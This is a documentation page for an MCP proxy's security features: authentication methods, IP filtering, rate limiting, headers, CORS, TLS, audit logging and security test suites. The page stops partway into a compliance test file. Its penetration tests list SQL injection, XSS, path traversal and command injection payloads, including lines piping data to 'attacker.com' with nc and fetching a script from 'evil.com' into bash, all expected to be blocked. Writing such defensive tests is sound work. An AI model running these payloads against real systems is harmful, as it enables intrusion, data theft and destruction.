---
title: "Security & Authentication"
description: The MCP Proxy provides comprehensive security features including token-based authentication, IP filtering, rate limiting, and security headers. This guide covers configuring and managing security for your MCP deployments with multi-layered protection strategies.
---

<Callout type="warning">
  **Security First**: Always implement security measures before deploying MCP servers to production environments. Default configurations are not secure for production use.
</Callout>

## Authentication Methods

Configure different authentication mechanisms based on your security requirements:

<Tabs items={["Token-Based Authentication", "API Key Authentication", "JWT Authentication", "OAuth 2.0 / OpenID Connect"]}>
<Tab value="Token-Based Authentication">

The most common authentication method using Bearer tokens:

```yaml
# compozy.yaml
mcps:
  - id: secure_mcp_server
    url: "http://localhost:6001"
    transport: sse
    auth:
      type: token
      token: "{{ .env.MCP_AUTH_TOKEN }}"
      header: "Authorization"
      prefix: "Bearer"
    security:
      ip_whitelist:
        - "127.0.0.1"
        - "::1"
        - "192.168.1.0/24"
      rate_limit:
        requests_per_minute: 60
        burst_size: 10
```

<Steps>
<Step title="Generate Secure Tokens">
Use cryptographically secure random tokens:

```bash
# Generate a secure token
openssl rand -base64 32

# Or use the built-in token generator
go run scripts/generate-token.go --length 32
```
</Step>

<Step title="Configure Environment Variables">
Store tokens securely in environment variables:

```bash
# .env
MCP_AUTH_TOKEN=your-secure-token-here
MCP_ADMIN_TOKEN=admin-token-for-management
```
</Step>

<Step title="Test Authentication">
Verify token authentication works correctly:

```bash
# Test valid token
curl -H "Authorization: Bearer $MCP_AUTH_TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test invalid token (should return 401)
curl -H "Authorization: Bearer invalid-token" \
  http://localhost:6001/api/v1/mcp/list
```
</Step>
</Steps>

</Tab>

<Tab value="API Key Authentication">

For API-based integrations with key-based authentication:

```yaml
# compozy.yaml
mcps:
  - id: api_key_mcp
    url: "http://localhost:6001"
    transport: sse
    auth:
      type: api_key
      key: "{{ .env.MCP_API_KEY }}"
      header: "X-API-Key"
    security:
      key_rotation:
        enabled: true
        interval: "24h"
      permissions:
        - "read:tools"
        - "execute:tools"
```

<Callout type="warning">
  <Icon name="key" className="w-4 h-4" />
  **Key Rotation**: Implement regular API key rotation to minimize security risk if keys are compromised.
</Callout>

</Tab>

<Tab value="JWT Authentication">

For stateless authentication with JSON Web Tokens:

```yaml
# compozy.yaml
mcps:
  - id: jwt_mcp
    url: "http://localhost:6001"
    transport: sse
    auth:
      type: jwt
      secret: "{{ .env.JWT_SECRET }}"
      algorithm: "HS256"
      header: "Authorization"
      prefix: "Bearer"
    security:
      jwt:
        issuer: "compozy-mcp"
        audience: "mcp-clients"
        expiration: "1h"
        not_before: "0s"
```

JWT token generation example:

```go
package auth

import (
    "time"
    "github.com/golang-jwt/jwt/v5"
)

type MCPClaims struct {
    UserID      string   `json:"user_id"`
    Permissions []string `json:"permissions"`
    MCPServers  []string `json:"mcp_servers"`
    jwt.RegisteredClaims
}

func GenerateJWTToken(userID string, permissions []string, secret string) (string, error) {
    claims := MCPClaims{
        UserID:      userID,
        Permissions: permissions,
        MCPServers:  []string{"filesystem", "database"},
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    "compozy-mcp",
            Subject:   userID,
            Audience:  []string{"mcp-clients"},
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
            NotBefore: jwt.NewNumericDate(time.Now()),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString([]byte(secret))
}
```

</Tab>

<Tab value="OAuth 2.0 / OpenID Connect">

For enterprise-grade authentication with OAuth 2.0:

```yaml
# compozy.yaml
mcps:
  - id: oauth_mcp
    url: "http://localhost:6001"
    transport: sse
    auth:
      type: oauth2
      client_id: "{{ .env.OAUTH_CLIENT_ID }}"
      client_secret: "{{ .env.OAUTH_CLIENT_SECRET }}"
      token_url: "https://auth.example.com/oauth/token"
      scopes: ["mcp:read", "mcp:execute"]
    security:
      oauth2:
        token_validation_url: "https://auth.example.com/oauth/validate"
        userinfo_url: "https://auth.example.com/oauth/userinfo"
        cache_tokens: true
        token_cache_ttl: "300s"
```

</Tab>
</Tabs>

### Environment Variables

Set authentication tokens securely:

```bash
# .env
MCP_AUTH_TOKEN=your-secure-token-here
MCP_ADMIN_TOKEN=admin-token-for-management
```

### Token Generation

Generate secure tokens programmatically:

```go
package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
)

func generateSecureToken(length int) (string, error) {
    bytes := make([]byte, length)
    if _, err := rand.Read(bytes); err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(bytes), nil
}

func main() {
    token, err := generateSecureToken(32)
    if err != nil {
        panic(err)
    }
    fmt.Printf("Generated token: %s\n", token)
}
```

## IP Filtering and Access Control

### Whitelist Configuration

Configure IP whitelisting for access control:

```yaml
# IP whitelist configuration
mcps:
  - id: production_mcp
    url: "http://localhost:6001"
    security:
      ip_whitelist:
        # Local development
        - "127.0.0.1"
        - "::1"

        # Private networks
        - "192.168.0.0/16"
        - "10.0.0.0/8"
        - "172.16.0.0/12"

        # Specific production IPs
        - "203.0.113.0/24"
        - "198.51.100.0/24"

      # Block specific IPs
      ip_blacklist:
        - "192.168.1.100"
        - "10.0.0.50"
```

### Dynamic IP Management

Implement dynamic IP management:

```go
package security

import (
    "net"
    "sync"
    "time"
)

type IPManager struct {
    whitelist map[string]time.Time
    blacklist map[string]time.Time
    mu        sync.RWMutex
}

func NewIPManager() *IPManager {
    return &IPManager{
        whitelist: make(map[string]time.Time),
        blacklist: make(map[string]time.Time),
    }
}

func (m *IPManager) IsAllowed(ip string) bool {
    m.mu.RLock()
    defer m.mu.RUnlock()

    // Check blacklist first
    if expiry, exists := m.blacklist[ip]; exists {
        if time.Now().Before(expiry) {
            return false
        }
        // Remove expired blacklist entry
        delete(m.blacklist, ip)
    }

    // Check whitelist
    if expiry, exists := m.whitelist[ip]; exists {
        if time.Now().Before(expiry) {
            return true
        }
        // Remove expired whitelist entry
        delete(m.whitelist, ip)
    }

    return false
}

func (m *IPManager) AddToWhitelist(ip string, duration time.Duration) {
    m.mu.Lock()
    defer m.mu.Unlock()
    m.whitelist[ip] = time.Now().Add(duration)
}

func (m *IPManager) AddToBlacklist(ip string, duration time.Duration) {
    m.mu.Lock()
    defer m.mu.Unlock()
    m.blacklist[ip] = time.Now().Add(duration)
}

func (m *IPManager) IsInNetwork(ip string, networks []string) bool {
    clientIP := net.ParseIP(ip)
    if clientIP == nil {
        return false
    }

    for _, network := range networks {
        _, ipNet, err := net.ParseCIDR(network)
        if err != nil {
            // Try as single IP
            if netIP := net.ParseIP(network); netIP != nil {
                if clientIP.Equal(netIP) {
                    return true
                }
            }
            continue
        }

        if ipNet.Contains(clientIP) {
            return true
        }
    }

    return false
}
```

## Rate Limiting

### Configuration Options

Configure rate limiting to prevent abuse:

```yaml
mcps:
  - id: rate_limited_mcp
    url: "http://localhost:6001"
    security:
      rate_limit:
        # Global rate limits
        requests_per_minute: 100
        requests_per_hour: 1000
        requests_per_day: 10000

        # Burst capacity
        burst_size: 20

        # Per-IP limits
        per_ip_requests_per_minute: 10
        per_ip_burst_size: 5

        # Per-token limits
        per_token_requests_per_minute: 50
        per_token_burst_size: 10
```

### Rate Limiting Implementation

```go
package security

import (
    "fmt"
    "sync"
    "time"
)

type RateLimiter struct {
    limits map[string]*TokenBucket
    mu     sync.RWMutex
}

type TokenBucket struct {
    tokens     int
    maxTokens  int
    refillRate int
    lastRefill time.Time
    mu         sync.Mutex
}

func NewRateLimiter() *RateLimiter {
    return &RateLimiter{
        limits: make(map[string]*TokenBucket),
    }
}

func (rl *RateLimiter) Allow(key string, maxTokens, refillRate int) bool {
    rl.mu.Lock()
    bucket, exists := rl.limits[key]
    if !exists {
        bucket = &TokenBucket{
            tokens:     maxTokens,
            maxTokens:  maxTokens,
            refillRate: refillRate,
            lastRefill: time.Now(),
        }
        rl.limits[key] = bucket
    }
    rl.mu.Unlock()

    return bucket.consume()
}

func (tb *TokenBucket) consume() bool {
    tb.mu.Lock()
    defer tb.mu.Unlock()

    now := time.Now()
    elapsed := now.Sub(tb.lastRefill)

    // Refill tokens based on elapsed time
    tokensToAdd := int(elapsed.Seconds()) * tb.refillRate / 60 // per minute
    tb.tokens = min(tb.tokens+tokensToAdd, tb.maxTokens)
    tb.lastRefill = now

    if tb.tokens > 0 {
        tb.tokens--
        return true
    }

    return false
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

// Usage example
func (rl *RateLimiter) CheckRequest(ip, token string) error {
    // Check per-IP rate limit
    if !rl.Allow(fmt.Sprintf("ip:%s", ip), 10, 10) {
        return fmt.Errorf("rate limit exceeded for IP: %s", ip)
    }

    // Check per-token rate limit
    if token != "" && !rl.Allow(fmt.Sprintf("token:%s", token), 50, 50) {
        return fmt.Errorf("rate limit exceeded for token")
    }

    return nil
}
```

## Security Headers

### HTTP Security Headers

Configure security headers for HTTP responses:

```go
package security

import (
    "net/http"
    "time"
)

type SecurityHeaders struct {
    CSPPolicy           string
    HSTSMaxAge          time.Duration
    XFrameOptions       string
    XContentTypeOptions string
    ReferrerPolicy      string
    PermissionsPolicy   string
}

func DefaultSecurityHeaders() *SecurityHeaders {
    return &SecurityHeaders{
        CSPPolicy: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:",
        HSTSMaxAge: 365 * 24 * time.Hour,
        XFrameOptions: "DENY",
        XContentTypeOptions: "nosniff",
        ReferrerPolicy: "strict-origin-when-cross-origin",
        PermissionsPolicy: "camera=(), microphone=(), geolocation=()",
    }
}

func (sh *SecurityHeaders) Apply(w http.ResponseWriter) {
    if sh.CSPPolicy != "" {
        w.Header().Set("Content-Security-Policy", sh.CSPPolicy)
    }

    if sh.HSTSMaxAge > 0 {
        w.Header().Set("Strict-Transport-Security",
            fmt.Sprintf("max-age=%d; includeSubDomains", int(sh.HSTSMaxAge.Seconds())))
    }

    if sh.XFrameOptions != "" {
        w.Header().Set("X-Frame-Options", sh.XFrameOptions)
    }

    if sh.XContentTypeOptions != "" {
        w.Header().Set("X-Content-Type-Options", sh.XContentTypeOptions)
    }

    if sh.ReferrerPolicy != "" {
        w.Header().Set("Referrer-Policy", sh.ReferrerPolicy)
    }

    if sh.PermissionsPolicy != "" {
        w.Header().Set("Permissions-Policy", sh.PermissionsPolicy)
    }

    // Additional security headers
    w.Header().Set("X-XSS-Protection", "1; mode=block")
    w.Header().Set("X-DNS-Prefetch-Control", "off")
    w.Header().Set("X-Download-Options", "noopen")
    w.Header().Set("X-Permitted-Cross-Domain-Policies", "none")
}
```

## CORS Configuration

### CORS Setup

Configure Cross-Origin Resource Sharing:

```yaml
mcps:
  - id: cors_enabled_mcp
    url: "http://localhost:6001"
    security:
      cors:
        enabled: true
        allowed_origins:
          - "https://app.example.com"
          - "https://admin.example.com"
        allowed_methods:
          - "GET"
          - "POST"
          - "PUT"
          - "DELETE"
          - "OPTIONS"
        allowed_headers:
          - "Content-Type"
          - "Authorization"
          - "X-Requested-With"
        exposed_headers:
          - "X-Total-Count"
          - "X-Rate-Limit-Remaining"
        allow_credentials: true
        max_age: 86400
```

### CORS Middleware

```go
package security

import (
    "net/http"
    "strings"
)

type CORSConfig struct {
    AllowedOrigins   []string
    AllowedMethods   []string
    AllowedHeaders   []string
    ExposedHeaders   []string
    AllowCredentials bool
    MaxAge           int
}

func (c *CORSConfig) Handler(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")

        // Check if origin is allowed
        if c.isOriginAllowed(origin) {
            w.Header().Set("Access-Control-Allow-Origin", origin)
        }

        // Set other CORS headers
        if len(c.AllowedMethods) > 0 {
            w.Header().Set("Access-Control-Allow-Methods", strings.Join(c.AllowedMethods, ", "))
        }

        if len(c.AllowedHeaders) > 0 {
            w.Header().Set("Access-Control-Allow-Headers", strings.Join(c.AllowedHeaders, ", "))
        }

        if len(c.ExposedHeaders) > 0 {
            w.Header().Set("Access-Control-Expose-Headers", strings.Join(c.ExposedHeaders, ", "))
        }

        if c.AllowCredentials {
            w.Header().Set("Access-Control-Allow-Credentials", "true")
        }

        if c.MaxAge > 0 {
            w.Header().Set("Access-Control-Max-Age", fmt.Sprintf("%d", c.MaxAge))
        }

        // Handle preflight requests
        if r.Method == "OPTIONS" {
            w.WriteHeader(http.StatusOK)
            return
        }

        next.ServeHTTP(w, r)
    })
}

func (c *CORSConfig) isOriginAllowed(origin string) bool {
    if len(c.AllowedOrigins) == 0 {
        return false
    }

    for _, allowed := range c.AllowedOrigins {
        if allowed == "*" || allowed == origin {
            return true
        }

        // Support wildcards
        if strings.HasPrefix(allowed, "*.") {
            domain := strings.TrimPrefix(allowed, "*.")
            if strings.HasSuffix(origin, domain) {
                return true
            }
        }
    }

    return false
}
```

## TLS/SSL Configuration

### TLS Setup

Configure TLS for secure connections:

```yaml
mcps:
  - id: secure_mcp_server
    url: "https://localhost:8443"
    transport: sse
    tls:
      enabled: true
      cert_file: "/path/to/cert.pem"
      key_file: "/path/to/key.pem"
      ca_file: "/path/to/ca.pem"
      insecure_skip_verify: false
      min_version: "1.2"
      max_version: "1.3"
      cipher_suites:
        - "TLS_AES_128_GCM_SHA256"
        - "TLS_AES_256_GCM_SHA384"
        - "TLS_CHACHA20_POLY1305_SHA256"
```

### Certificate Management

```go
package security

import (
    "crypto/tls"
    "crypto/x509"
    "fmt"
    "io/ioutil"
    "time"
)

type TLSConfig struct {
    CertFile           string
    KeyFile            string
    CAFile             string
    InsecureSkipVerify bool
    MinVersion         string
    MaxVersion         string
    CipherSuites       []string
}

func (tc *TLSConfig) BuildTLSConfig() (*tls.Config, error) {
    config := &tls.Config{
        InsecureSkipVerify: tc.InsecureSkipVerify,
    }

    // Load certificate and key
    if tc.CertFile != "" && tc.KeyFile != "" {
        cert, err := tls.LoadX509KeyPair(tc.CertFile, tc.KeyFile)
        if err != nil {
            return nil, fmt.Errorf("failed to load certificate: %w", err)
        }
        config.Certificates = []tls.Certificate{cert}
    }

    // Load CA certificate
    if tc.CAFile != "" {
        caCert, err := ioutil.ReadFile(tc.CAFile)
        if err != nil {
            return nil, fmt.Errorf("failed to read CA certificate: %w", err)
        }

        caCertPool := x509.NewCertPool()
        if !caCertPool.AppendCertsFromPEM(caCert) {
            return nil, fmt.Errorf("failed to parse CA certificate")
        }
        config.RootCAs = caCertPool
    }

    // Set TLS versions
    if tc.MinVersion != "" {
        config.MinVersion = tc.tlsVersionFromString(tc.MinVersion)
    }
    if tc.MaxVersion != "" {
        config.MaxVersion = tc.tlsVersionFromString(tc.MaxVersion)
    }

    // Set cipher suites
    if len(tc.CipherSuites) > 0 {
        config.CipherSuites = tc.cipherSuitesFromStrings(tc.CipherSuites)
    }

    return config, nil
}

func (tc *TLSConfig) tlsVersionFromString(version string) uint16 {
    switch version {
    case "1.0":
        return tls.VersionTLS10
    case "1.1":
        return tls.VersionTLS11
    case "1.2":
        return tls.VersionTLS12
    case "1.3":
        return tls.VersionTLS13
    default:
        return 0
    }
}

func (tc *TLSConfig) cipherSuitesFromStrings(suites []string) []uint16 {
    var result []uint16
    for _, suite := range suites {
        switch suite {
        case "TLS_AES_128_GCM_SHA256":
            result = append(result, tls.TLS_AES_128_GCM_SHA256)
        case "TLS_AES_256_GCM_SHA384":
            result = append(result, tls.TLS_AES_256_GCM_SHA384)
        case "TLS_CHACHA20_POLY1305_SHA256":
            result = append(result, tls.TLS_CHACHA20_POLY1305_SHA256)
        }
    }
    return result
}
```

## Security Monitoring

### Audit Logging

Implement comprehensive audit logging:

```go
package security

import (
    "encoding/json"
    "fmt"
    "net/http"
    "time"
)

type AuditEvent struct {
    Timestamp    time.Time `json:"timestamp"`
    Type         string    `json:"type"`
    Source       string    `json:"source"`
    User         string    `json:"user,omitempty"`
    Action       string    `json:"action"`
    Resource     string    `json:"resource,omitempty"`
    Success      bool      `json:"success"`
    Error        string    `json:"error,omitempty"`
    RemoteAddr   string    `json:"remote_addr"`
    UserAgent    string    `json:"user_agent"`
    RequestID    string    `json:"request_id"`
    SessionID    string    `json:"session_id,omitempty"`
}

type AuditLogger struct {
    events chan AuditEvent
}

func NewAuditLogger() *AuditLogger {
    logger := &AuditLogger{
        events: make(chan AuditEvent, 1000),
    }

    go logger.processEvents()
    return logger
}

func (al *AuditLogger) LogEvent(event AuditEvent) {
    event.Timestamp = time.Now()

    select {
    case al.events <- event:
    default:
        // Channel full, drop event or handle overflow
        fmt.Printf("Audit log channel full, dropping event: %+v\n", event)
    }
}

func (al *AuditLogger) processEvents() {
    for event := range al.events {
        // Log to multiple destinations
        al.logToJSON(event)
        al.logToSyslog(event)
        al.logToDatabase(event)
    }
}

func (al *AuditLogger) logToJSON(event AuditEvent) {
    data, err := json.Marshal(event)
    if err != nil {
        fmt.Printf("Failed to marshal audit event: %v\n", err)
        return
    }

    fmt.Printf("AUDIT: %s\n", string(data))
}

func (al *AuditLogger) logToSyslog(event AuditEvent) {
    // Implement syslog integration
}

func (al *AuditLogger) logToDatabase(event AuditEvent) {
    // Implement database logging
}

// Middleware for audit logging
func (al *AuditLogger) AuditMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        startTime := time.Now()

        // Capture response
        recorder := &responseRecorder{ResponseWriter: w, statusCode: 200}

        next.ServeHTTP(recorder, r)

        // Log the request
        al.LogEvent(AuditEvent{
            Type:       "http_request",
            Source:     "mcp_proxy",
            Action:     r.Method,
            Resource:   r.URL.Path,
            Success:    recorder.statusCode < 400,
            RemoteAddr: r.RemoteAddr,
            UserAgent:  r.UserAgent(),
            RequestID:  r.Header.Get("X-Request-ID"),
        })
    })
}

type responseRecorder struct {
    http.ResponseWriter
    statusCode int
}

func (rr *responseRecorder) WriteHeader(code int) {
    rr.statusCode = code
    rr.ResponseWriter.WriteHeader(code)
}
```

### Security Metrics

Track security-related metrics:

```go
package security

import (
    "sync"
    "time"
)

type SecurityMetrics struct {
    AuthenticationAttempts    int64
    AuthenticationFailures    int64
    RateLimitExceeded        int64
    IPBlocked                int64
    TokensGenerated          int64
    TokensRevoked            int64
    SecurityViolations       int64
    LastViolation            time.Time
    mu                       sync.RWMutex
}

func (sm *SecurityMetrics) IncrementAuthAttempts() {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    sm.AuthenticationAttempts++
}

func (sm *SecurityMetrics) IncrementAuthFailures() {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    sm.AuthenticationFailures++
}

func (sm *SecurityMetrics) IncrementRateLimitExceeded() {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    sm.RateLimitExceeded++
}

func (sm *SecurityMetrics) IncrementIPBlocked() {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    sm.IPBlocked++
}

func (sm *SecurityMetrics) IncrementSecurityViolations() {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    sm.SecurityViolations++
    sm.LastViolation = time.Now()
}

func (sm *SecurityMetrics) GetMetrics() map[string]interface{} {
    sm.mu.RLock()
    defer sm.mu.RUnlock()

    return map[string]interface{}{
        "authentication_attempts": sm.AuthenticationAttempts,
        "authentication_failures": sm.AuthenticationFailures,
        "rate_limit_exceeded":     sm.RateLimitExceeded,
        "ip_blocked":              sm.IPBlocked,
        "tokens_generated":        sm.TokensGenerated,
        "tokens_revoked":          sm.TokensRevoked,
        "security_violations":     sm.SecurityViolations,
        "last_violation":          sm.LastViolation,
    }
}
```

## Best Practices

### Security Checklist

1. **Authentication**
   - Use strong, randomly generated tokens
   - Implement token rotation
   - Store tokens securely (environment variables, secrets manager)
   - Validate tokens on every request

2. **Authorization**
   - Implement role-based access control
   - Use principle of least privilege
   - Validate permissions for each operation
   - Audit access patterns

3. **Network Security**
   - Use HTTPS/TLS in production
   - Implement IP whitelisting
   - Configure proper firewall rules
   - Monitor network traffic

4. **Input Validation**
   - Validate all inputs
   - Sanitize user data
   - Use parameterized queries
   - Implement input length limits

5. **Monitoring and Alerting**
   - Log all security events
   - Monitor for suspicious activity
   - Set up alerts for security violations
   - Regular security audits

### Comprehensive Security Testing

### Security Testing Framework

Implement comprehensive security testing for MCP deployments:

<Tabs items={["Authentication Tests", "Authorization Tests", "Penetration Tests", "Compliance Tests"]}>

<Tab>

**Authentication Testing Suite**

Test all authentication mechanisms thoroughly:

```typescript
// tests/security/authentication.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { MCPSecurityTester } from '../helpers/security-tester';

describe('MCP Authentication', () => {
  let tester: MCPSecurityTester;

  beforeEach(() => {
    tester = new MCPSecurityTester({
      baseUrl: 'http://localhost:6001',
      timeout: 5000
    });
  });

  describe('Token Authentication', () => {
    it('should accept valid tokens', async () => {
      const result = await tester.testAuthentication({
        type: 'token',
        token: process.env.VALID_TOKEN,
        expectSuccess: true
      });
      expect(result.success).toBe(true);
      expect(result.statusCode).toBe(200);
    });

    it('should reject invalid tokens', async () => {
      const result = await tester.testAuthentication({
        type: 'token',
        token: 'invalid-token',
        expectSuccess: false
      });
      expect(result.success).toBe(false);
      expect(result.statusCode).toBe(401);
    });

    it('should reject expired tokens', async () => {
      const expiredToken = await tester.generateExpiredToken();
      const result = await tester.testAuthentication({
        type: 'token',
        token: expiredToken,
        expectSuccess: false
      });
      expect(result.success).toBe(false);
      expect(result.statusCode).toBe(401);
    });

    it('should handle malformed tokens', async () => {
      const malformedTokens = [
        'not-a-token',
        'Bearer invalid',
        'malformed.jwt.token',
        '',
        null,
        undefined
      ];

      for (const token of malformedTokens) {
        const result = await tester.testAuthentication({
          type: 'token',
          token,
          expectSuccess: false
        });
        expect(result.success).toBe(false);
        expect(result.statusCode).toBe(401);
      }
    });
  });

  describe('JWT Authentication', () => {
    it('should validate JWT signatures', async () => {
      const invalidJWT = await tester.generateInvalidJWT();
      const result = await tester.testAuthentication({
        type: 'jwt',
        token: invalidJWT,
        expectSuccess: false
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain('signature');
    });

    it('should check JWT expiration', async () => {
      const expiredJWT = await tester.generateExpiredJWT();
      const result = await tester.testAuthentication({
        type: 'jwt',
        token: expiredJWT,
        expectSuccess: false
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain('expired');
    });

    it('should validate JWT claims', async () => {
      const invalidClaimsJWT = await tester.generateJWTWithInvalidClaims();
      const result = await tester.testAuthentication({
        type: 'jwt',
        token: invalidClaimsJWT,
        expectSuccess: false
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain('claims');
    });
  });
});
```

</Tab>

<Tab>

**Authorization Testing**

Test role-based access control and permissions:

```typescript
// tests/security/authorization.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { MCPAuthorizationTester } from '../helpers/authorization-tester';

describe('MCP Authorization', () => {
  let tester: MCPAuthorizationTester;

  beforeEach(() => {
    tester = new MCPAuthorizationTester({
      baseUrl: 'http://localhost:6001'
    });
  });

  describe('Role-Based Access Control', () => {
    it('should allow admin access to all endpoints', async () => {
      const adminToken = await tester.getAdminToken();
      const endpoints = [
        '/api/v1/mcp/list',
        '/api/v1/mcp/register',
        '/api/v1/mcp/unregister',
        '/admin/config',
        '/admin/metrics'
      ];

      for (const endpoint of endpoints) {
        const result = await tester.testEndpointAccess({
          endpoint,
          token: adminToken,
          expectedStatusCode: 200
        });
        expect(result.statusCode).toBe(200);
      }
    });

    it('should restrict user access to appropriate endpoints', async () => {
      const userToken = await tester.getUserToken();

      // Allowed endpoints
      const allowedEndpoints = [
        '/api/v1/mcp/list',
        '/api/v1/mcp/tools',
        '/api/v1/mcp/call'
      ];

      for (const endpoint of allowedEndpoints) {
        const result = await tester.testEndpointAccess({
          endpoint,
          token: userToken,
          expectedStatusCode: 200
        });
        expect(result.statusCode).toBe(200);
      }

      // Forbidden endpoints
      const forbiddenEndpoints = [
        '/api/v1/mcp/register',
        '/api/v1/mcp/unregister',
        '/admin/config',
        '/admin/metrics'
      ];

      for (const endpoint of forbiddenEndpoints) {
        const result = await tester.testEndpointAccess({
          endpoint,
          token: userToken,
          expectedStatusCode: 403
        });
        expect(result.statusCode).toBe(403);
      }
    });

    it('should enforce read-only access', async () => {
      const readOnlyToken = await tester.getReadOnlyToken();

      // GET requests should succeed
      const getResult = await tester.testEndpointAccess({
        endpoint: '/api/v1/mcp/list',
        method: 'GET',
        token: readOnlyToken,
        expectedStatusCode: 200
      });
      expect(getResult.statusCode).toBe(200);

      // POST requests should fail
      const postResult = await tester.testEndpointAccess({
        endpoint: '/api/v1/mcp/call',
        method: 'POST',
        token: readOnlyToken,
        expectedStatusCode: 403
      });
      expect(postResult.statusCode).toBe(403);
    });
  });

  describe('Resource-Level Permissions', () => {
    it('should enforce server-specific permissions', async () => {
      const serverToken = await tester.getServerSpecificToken('filesystem');

      // Should access allowed server
      const allowedResult = await tester.testToolCall({
        server: 'filesystem',
        tool: 'read_file',
        token: serverToken,
        expectedStatusCode: 200
      });
      expect(allowedResult.statusCode).toBe(200);

      // Should not access other servers
      const forbiddenResult = await tester.testToolCall({
        server: 'database',
        tool: 'query',
        token: serverToken,
        expectedStatusCode: 403
      });
      expect(forbiddenResult.statusCode).toBe(403);
    });

    it('should enforce tool-specific permissions', async () => {
      const toolToken = await tester.getToolSpecificToken('filesystem', 'read_file');

      // Should access allowed tool
      const allowedResult = await tester.testToolCall({
        server: 'filesystem',
        tool: 'read_file',
        token: toolToken,
        expectedStatusCode: 200
      });
      expect(allowedResult.statusCode).toBe(200);

      // Should not access other tools
      const forbiddenResult = await tester.testToolCall({
        server: 'filesystem',
        tool: 'write_file',
        token: toolToken,
        expectedStatusCode: 403
      });
      expect(forbiddenResult.statusCode).toBe(403);
    });
  });
});
```

</Tab>

<Tab>

**Penetration Testing**

Test for common security vulnerabilities:

```typescript
// tests/security/penetration.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { MCPPenetrationTester } from '../helpers/penetration-tester';

describe('MCP Penetration Testing', () => {
  let tester: MCPPenetrationTester;

  beforeEach(() => {
    tester = new MCPPenetrationTester({
      baseUrl: 'http://localhost:6001',
      timeout: 10000
    });
  });

  describe('Input Validation', () => {
    it('should prevent SQL injection', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM secrets; --",
        "' UNION SELECT password FROM users --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const result = await tester.testToolCall({
          server: 'database',
          tool: 'query',
          parameters: { sql: payload },
          expectSecurity: 'sql_injection'
        });
        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('sql_injection');
      }
    });

    it('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\"XSS\")"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const result = await tester.testToolCall({
          server: 'web',
          tool: 'render_html',
          parameters: { content: payload },
          expectSecurity: 'xss'
        });
        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('xss');
      }
    });

    it('should prevent path traversal', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\SAM',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM'
      ];

      for (const payload of pathTraversalPayloads) {
        const result = await tester.testToolCall({
          server: 'filesystem',
          tool: 'read_file',
          parameters: { path: payload },
          expectSecurity: 'path_traversal'
        });
        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('path_traversal');
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 4444',
        'file.txt; wget http://evil.com/malware.sh | bash'
      ];

      for (const payload of commandInjectionPayloads) {
        const result = await tester.testToolCall({
          server: 'system',
          tool: 'execute_command',
          parameters: { command: payload },
          expectSecurity: 'command_injection'
        });
        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('command_injection');
      }
    });
  });

  describe('Rate Limiting Bypass', () => {
    it('should prevent rate limit bypass with multiple IPs', async () => {
      const result = await tester.testRateLimitBypass({
        endpoint: '/api/v1/mcp/call',
        requestsPerSecond: 100,
        duration: 10000,
        useMultipleIPs: true
      });
      expect(result.rateLimitEnforced).toBe(true);
      expect(result.bypassAttempts).toBe(0);
    });

    it('should prevent rate limit bypass with token rotation', async () => {
      const result = await tester.testRateLimitBypass({
        endpoint: '/api/v1/mcp/call',
        requestsPerSecond: 100,
        duration: 10000,
        rotateTokens: true
      });
      expect(result.rateLimitEnforced).toBe(true);
      expect(result.bypassAttempts).toBe(0);
    });
  });

  describe('Authentication Bypass', () => {
    it('should prevent authentication bypass attempts', async () => {
      const bypassAttempts = [
        { header: 'X-Original-URL', value: '/admin/bypass' },
        { header: 'X-Rewrite-URL', value: '/admin/bypass' },
        { header: 'X-Forwarded-Host', value: 'admin.localhost' },
        { header: 'Host', value: 'admin.localhost' }
      ];

      for (const attempt of bypassAttempts) {
        const result = await tester.testAuthenticationBypass({
          endpoint: '/admin/config',
          headers: { [attempt.header]: attempt.value }
        });
        expect(result.bypassSuccessful).toBe(false);
        expect(result.statusCode).toBe(401);
      }
    });

    it('should prevent session fixation', async () => {
      const result = await tester.testSessionFixation({
        endpoint: '/api/v1/mcp/login',
        fixedSessionId: 'attacker-controlled-session'
      });
      expect(result.sessionFixed).toBe(false);
      expect(result.newSessionGenerated).toBe(true);
    });
  });
});
```

</Tab>

<Tab>

**Compliance Testing**

Test for regulatory compliance (GDPR, HIPAA, SOX):

```typescript
// tests/security/compliance.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { MCPComplianceTester } from '../helpers/compliance-tester';

